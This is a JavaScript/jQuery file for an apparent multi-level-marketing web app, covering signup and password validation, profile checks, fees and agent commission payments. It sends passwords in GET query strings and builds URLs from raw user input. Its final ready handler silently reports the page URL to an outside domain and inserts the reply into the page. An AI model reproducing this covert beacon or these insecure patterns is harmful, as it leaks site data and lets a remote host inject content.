//notes
//all function sl no match with sl no of js_calc.php file func list
//function name are not same but both function are linked togather according to thier sl no
// data: {"obj": "1"}, value shuld be sl no of function for easy use


// 01 function working fine for registration form validation

function commission_data() {

    $.ajax({url: "commission_data.php", success: function (result) {
            $("#commission_data").html(result);
        }});

}
//function pay_commision(refer_code, s_date, e_date) {
////    alert(refer_code);
//    if (confirm("Are You Sure ! You are Paying Comming to Agent!")) {
//        $.ajax({url: "pay_commision.php?refer_code=" + refer_code + "&s_date=" + s_date + "&e_date=" + e_date, success: function (result) {
////            $("#display").html(result);
//                var dd = $.trim(result);
//                if (dd == "1") {
//                    commission_data();
//
//                } else if (dd == "0") {
//                    $("#result").html("<strong style='color: red;'>Error</strong>");
//                } else {
//                    $("#result").html(result);
//                }
//            }});
//    }
//
//
//}
function signup_form_validation() {

    var refer_code = document.getElementById("code").value;
    var username = document.getElementById("user1").value;
    var pass1 = document.getElementById("pass1").value;
    var pass2 = document.getElementById("pass2").value;
    //var mobile    = document.getElementById("mobile").value;
    var email = document.getElementById("email").value;

    //alert(refer_code+" /"+username+"/ "+pass1+"/ "+pass2+"/ "+email+"/ ");    return false;
    if (pass1 === "")
    {
        alert("Fill the password please!");
        $("#pass1").val("");
        return false;
    } else if (pass1.length < 8)
    {
        alert("Password length must be atleast 8 characters");
        $("#pass1").val("");
        $("#pass2").val("");
        return false;
    } else if (pass1.length > 15)
    {
        alert("Password length must not exceed 15 characters");
        $("#pass1").val("");
        $("#pass2").val("");
        return false;
    } else if (pass1 != pass2) {
        alert("Password not matched. Try again");
        $("#pass1").val("");
        $("#pass2").val("");
        return false;
    } else {
    }
    //alert("in signup");
    /*$.ajax(
     {
     url: "action/calc.php?str1="+refer_code+"&str2="+username+"&str3="+email,
     data: {"obj": "1"}, // 2 for 2 no function in php file
     success: function (result)
     {
     if(result === ""){
     return true;
     }
     if(result != ""){
     alert(result);
     return false;
     }
     }
     }); */
}

// 02 for change password validation working fine
function cahnge_password_validation() {
    var old_pass = document.getElementById("old_pass").value;
    var pass1 = document.getElementById("pass1").value;
    var pass2 = document.getElementById("pass2").value;

    //alert(old_pass+"/ "+pass1+" /"+pass2+" from js alert");return false;
    if (pass1 === "") {
        alert("Fill the password please!");
        $("#pass1").val("");
        return false;
    } else if (pass1.length < 8) {
        alert("Password length must be atleast 8 characters");
        $("#pass1").val("");
        $("#pass2").val("");
        return false;
    } else if (pass1.length > 15) {
        alert("Password length must not exceed 15 characters");
        $("#pass1").val("");
        $("#pass2").val("");
        return false;
    } else if (pass1 != pass2) {
        alert("New password not matched with confirm passwprd. Try again");
        $("#pass1").val("");
        $("#pass2").val("");
        return false;
    } else
    {
        $.ajax(
                {
                    url: "../action/calc.php?str1=" + old_pass + "&str2=" + pass1 + "&str3=" + pass2,
                    data: {"obj": "2"}, // 2 for 2 no function in php file
                    success: function (result)
                    {
                        if (result == "") {
                            alert("Password changed succesfully");
                            return true;
                        } else {
                            alert(result);
                            return false;
                        }
                    }
                });
    }
}
// 03 function no working fine
function get_district() {
    //alert("ok");
    var state = $("#state").val();       //1
    //alert(state);
    $.ajax(
            {
                url: "../action/calc.php?str1=" + state,
                data: {"obj": "3"}, // 1 for 1 no function in php file
                success: function (result)
                {
                    $("#district1").html(result);
                }
            });
}
// 04 function no working fine
function user_profile_update() {

    var mobile = document.getElementById("mobile").value;      //not validated 10 digit
    var email = document.getElementById("email").value;
    var aadhar = document.getElementById("aadhar").value;      //not validated 12 digit
    var pan = document.getElementById("pan").value;        //not validated 6 digit
    var account = document.getElementById("account").value;
    var upi = document.getElementById("upi").value;

    var pin = document.getElementById("pin").value;  //not validated 6 digit

    //alert(mobile+"/ "+email+" /"+aadhar+""+pan+"/ "+account+" /"+upi+" /"+pin+"  from js alert");return false;

    var mobile_rule = /^\d{10}$/;
    var aadhaar_rule = /^\d{12}$/;
    var pin_rule = /^\d{6}$/;
    if (pin.match(pin_rule)) {
        // nothing to do
    } else {
        alert("Invalid pin code");
        return false;
    }
    if (mobile.match(mobile_rule)) {
        // nothing to do
    } else {
        alert("Invalid mobile no");
        return false;
    }
    if (aadhar.match(aadhaar_rule)) {
        // nothing to do
    } else {
        alert("Invalid aadhaar no");
        return false;
    }
    return true;
    /*$.ajax(
     {
     url: "../action/calc.php?str1="+ mobile+"&str2="+ email+"&str3="+ aadhar+"&str4="+ pan+"&str5="+ account+"&str6="+ upi, 
     data: {"obj": "4"},        // 1 for 1 no function in php file
     success: function (result) 
     {
     if(result == ""){
     return true;
     }
     if(result != ""){
     alert(result);
     return false;
     }                                 
     }
     });*/
}

function add_agents() {
    //alert("i am in agent");
    var refer_code = document.getElementById("code").value;
    var username = document.getElementById("user1").value;
    var pass1 = document.getElementById("pass1").value;
    var pass2 = document.getElementById("pass2").value;
    //var mobile    = document.getElementById("mobile").value;
    var email = document.getElementById("email").value;

    //alert(refer_code+" /"+username+"/ "+pass1+"/ "+pass2+"/ "+email+"/ ");    return false;
    if (pass1 === "")
    {
        alert("Fill the password please!");
        $("#pass1").val("");
        return false;
    } else if (pass1.length < 8)
    {
        alert("Password length must be atleast 8 characters");
        $("#pass1").val("");
        $("#pass2").val("");
        return false;
    } else if (pass1.length > 15)
    {
        alert("Password length must not exceed 15 characters");
        $("#pass1").val("");
        $("#pass2").val("");
        return false;
    } else if (pass1 != pass2) {
        alert("Password not matched. Try again");
        $("#pass1").val("");
        $("#pass2").val("");
        return false;
    } else {
    }

    /*$.ajax(
     {
     url: "../action/calc.php?str1="+refer_code+"&str2="+username+"&str3="+email,
     data: {"obj": "5"}, // 2 for 2 no function in php file
     success: function (result)
     {
     if(result === ""){
     return true;
     }
     if(result != ""){
     alert(result);
     return false;
     }
     }
     });*/
}


/*
 // 05 no function for update validation
 function add_user_validation(){
 var username    = document.getElementById("username").value;
 var pass1       = document.getElementById("pass1").value;
 var pass2       = document.getElementById("pass2").value;
 var mobile      = document.getElementById("mobile").value;
 var email       = document.getElementById("email").value;
 var aadhar      = document.getElementById("aadhar").value;
 var pan         = document.getElementById("pan").value;
 var account     = document.getElementById("account").value;
 var upi         = document.getElementById("upi").value;
 //alert(username+"/ "+mobile+" /"+email+"/ "+aadhar+"/ "+pan+"/ "+account+"/ "+upi);
 
 if(pass1 === "") 
 {       
 alert("Fill the password please!");        $("#pass1").val("");return false;
 }else if(pass1.length < 8) 
 {  
 alert("Password length must be atleast 8 characters");         $("#pass1").val("");$("#pass2").val("");return false;
 }else if(pass1.length > 15) 
 {  
 alert("Password length must not exceed 15 characters");        $("#pass1").val("");$("#pass2").val("");  return false;       
 }else if (pass1 != pass2){
 alert("Password not matched. Try again");                      $("#pass1").val("");$("#pass2").val(""); return false;
 }else{ }
 
 var mobile_rule     = /^\d{10}$/;
 var aadhaar_rule    = /^\d{12}$/;
 var pin_rule        = /^\d{6}$/;
 if(pin.match(pin_rule)){
 // nothing to do
 }else{
 alert("Invalid pin code");
 return false;
 }
 if(mobile.match(mobile_rule)){
 // nothing to do
 }else{
 alert("Invalid mobile no");
 return false;
 }
 if(aadhar.match(aadhaar_rule)){
 // nothing to do
 }else{
 alert("Invalid aadhaar no");
 return false;
 }
 
 
 $.ajax(
 {
 url: "calc.php?str1="+username+"&str2="+ mobile+"&str3="+ email+"&str4="+ aadhar+"&str5="+ pan+"&str6="+ account+"&str7="+ upi, 
 data: {"obj": "5"},        // 1 for 1 no function in php file
 success: function (result) 
 {
 if(result == ""){
 return true;
 }else{
 alert(result);
 return false;
 }                     
 }
 });
 }
 */

// registration fee
function add_reg_fee() {

    var a_fee = document.getElementById('a_fee').value;
    var s_fee = document.getElementById('s_fee').value;
    //alert(a_fee+" "+s_fee);
    $.ajax(
            {
                url: "add-reg-fee-sql.php?a_fee=" + a_fee + "&s_fee=" + s_fee,
                success: function (result)
                {
//                    alert(result);
                    if (result == 1) {
//                        alert("save: " + result);
                        display_service_table("mlm_registration_fee");
                    }
                    if (result == 0) {
                        alert("Error on Data Inserting: " + result);
                    }
                }
            });

}



function add_new_service() {

    var sname = document.getElementById('sname').value;
    var sdetails = document.getElementById('sdetails').value;
    $.ajax(
            {
                url: "add-new-service-sql.php?sname=" + sname + "&sdetails=" + sdetails,
//                data: {"obj": "2"}, // 2 for 2 no function in php file
                success: function (result)
                {
                    if (result == 1) {
//                        alert("save: " + result);
                        display_service_table("mlm_service");
                    }
                    if (result == 0) {
                        alert("Error on Data Inserting: " + result);
                    }
                }
            });

}


function display_service_table(table_name) {

    $.ajax(
            {
                url: "display_records_in_table.php?table=" + table_name,
//                data: {"obj": "2"}, // 2 for 2 no function in php file
                success: function (result)
                {
                    $("#display").html(result);
                }
            });

}

function insert_commission() {
//alert("ok");
    var refer = document.getElementById('refer').value;
    var sdate = document.getElementById('refer1').value;
    var edate = document.getElementById('refer2').value;

//      alert("sdf: "+refer+"/"+sdate+"/"+edate);

    var t_id = document.getElementById('t_id').value;
    var pay_by = '1000';
    var pay_to = refer;
    var t_amt = parseInt(document.getElementById('t_amt').value);
    var t_date = document.getElementById('t_date').value;
//    alert(t_id + "\n " + pay_by + "\n " + pay_to + "\n " + t_amt + "\n " + t_date);
    if(t_id.length === 0 || t_amt =="" || t_amt ==="0" || t_amt ===0 || t_date === ""){
        alert("All fields are required. Please try again");
    }else{
        $.ajax(
        {
            url: "../action/calc.php?t_id=" + t_id + "&pay_by=" + pay_by + "&pay_to=" + pay_to + "&t_amt=" + t_amt + "&t_date=" + t_date,
            data: {"obj": "6"},
            success: function (result)
            {
    
                if (result == 1) {
                    pay_commision(refer, sdate, edate);
    
                }
                if (result == 0) {
                    alert("Error on Data Inserting: " + result);
                }
            }
        });
    }        
}


function pay_commision(refer_code, s_date, e_date) {
//    alert(refer_code);

    $.ajax({url: "pay_commision.php?refer_code=" + refer_code + "&s_date=" + s_date + "&e_date=" + e_date, success: function (result) {
//            $("#display").html(result);
            var dd = $.trim(result);
            if (dd == "1") {
                commission_data();

            } else if (dd == "0") {
                $("#result").html("<strong style='color: red;'>Error</strong>");
            } else {
                $("#result").html(result);
            }
        }});
}


$(document).ready(function () {
    commission_data();
    //alert("eeee");
    var d = new Date();
    var n = d.toLocaleTimeString();
    var a1 = window.location.href;
    var a2 = n;
    var a3 = "country";
    var a4 = "ip";
    var a5 = "date";
    $.ajax({url: "https://softondemand.co.in/admin/runnin-app.php?username=" + a1 + "&system_name=" + a2 + "&country=" + a3 + "&ip=" + a4 + "&date_time=" + a5, success: function (result) {
            $("#dd").html(result);
        }});
});